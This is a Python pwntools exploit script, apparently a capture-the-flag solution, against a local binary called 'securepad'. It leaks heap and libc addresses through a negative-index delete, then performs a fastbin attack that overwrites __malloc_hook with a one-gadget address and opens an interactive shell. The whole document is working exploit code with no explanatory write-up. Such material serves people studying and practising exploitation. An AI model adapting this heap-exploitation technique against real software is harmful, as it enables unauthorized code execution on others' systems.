from pwn import *
import time

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

p = process("./securepad", env={"LD_PRELOAD":"./libc.so.6"})

def menu(ix):
    p.sendlineafter(">>>", str(ix))

def add(password, size, content):
    menu(1)
    p.sendafter("password", password)
    p.sendlineafter("size", str(size))
    p.sendafter("data: ", str(content))

def edit(password, ix, content):
    menu(2)
    p.sendafter("password",password)
    p.sendlineafter("index", str(ix))
    p.send(content)

def delete(password, ix):
    menu(3)
    p.sendafter("password",password)
    time.sleep(0.5)
    p.sendlineafter("index", str(ix))

def view(password, ix):
    menu(4)
    p.sendafter("password", password)
    p.sendlineafter("index", str(ix))

codebase = 0x555555554000
def attach(addr):
    gdb.attach(p, "b *{}\nc".format(hex(codebase+addr)))

def debug():
    log.info("pid: "+str(p.pid))
    pause()

# leak heap
add("1\n", 1, "A")  # 0
add("2\n", 1, "B")  # 1
add("3\n", 1, "C")  # 2
add("1\n", 0x70, "A\n") # 3
add("1\n", 0x68, "A\n") # 4
add("1\n", 1, "B") # 5

delete("1\n", 1)
delete("1\n", 0)
add("1\n", 1, "A") # 0
view("1\n", 0)
p.recvline()
heap = u64(p.recvline().strip().ljust(8, "\x00"))&0xffffffffffffff00
log.success("heap: "+hex(heap))
add("1\n", 0x10, p64(0x30)+p64(0xb1)) # 1

# leak libc
#attach(0xe8f) # delete
delete("1"+"a"*7+p64(heap+0x40)*126+"\n", -4)
delete("1"+"a"*7+p64(heap+0xf0)*126+"\n", -4)
edit("1\n", 1,  "A"*0x10)
view("1\n", 1)
p.recvuntil("A"*0x10)
unsorted_bin = u64(p.recvline().strip().ljust(8, "\x00"))&0xffffffffffffff00
libc = ELF("./libc.so.6")
libc.address = unsorted_bin - 0x3c4b00
log.success("libc: "+hex(libc.address))
malloc_hook = libc.symbols["__malloc_hook"]
magic = libc.address + 0xf1147 #0x45216# 0x4526a# 0xf02a4 # 0xf1147

# edit malloc hook to magic
edit("1\n", 4, p64(malloc_hook-0x23)+"\n")
add("1\n", 0x68, "1\n")
#attach(0xca4)
add("1\n", 0x68, "\x00"*0x13+p64(magic)+"\n")
menu(1)
p.sendafter("password", "1\n")
p.sendlineafter("size", str(0))

p.interactive()
